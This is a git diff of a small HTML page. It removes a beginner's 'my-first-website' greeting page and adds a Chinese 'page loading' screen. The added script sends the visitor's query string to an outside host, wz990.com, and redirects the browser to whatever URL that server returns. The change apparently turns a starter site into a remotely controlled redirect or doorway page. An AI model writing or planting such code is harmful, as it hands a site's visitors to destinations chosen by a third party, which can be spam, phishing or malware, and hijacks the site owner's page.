@@ -1,18 +1,21 @@
 <!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+        <title></title>
+    </head>
+    
+    <body>
+      <center><img src="https://49work.oss-cn-hangzhou.aliyuncs.com/fb4a9ba2949035eb170974d08394a1e5.gif">
+<h1>网页正在载入中！</h1></center>
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script>
 
-<html>
-<head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
-  <title>my-first-website</title>
-  <LINK href="styles.css" rel="stylesheet" type="text/css">
-</head>
-
-<body>
-
-<img src="https://octodex.github.com/images/daftpunktocat-thomas.gif" id="octocat" alt="octocat-gif" />
-
-<!-- Change this code here by copy and pasting your template on line 15 -->
-<p>你好啊!</p>
-
-</body>
+var src ='http://wz990.com/api/go_free_bt/'+ window.location.search.substring(1)+'/?t='+  (+new Date());
+console.log(src);
+  $.get(src, function(r){
+      window.location.href = r;
+    },'JSON');
+</script>
+    </body>
 </html>
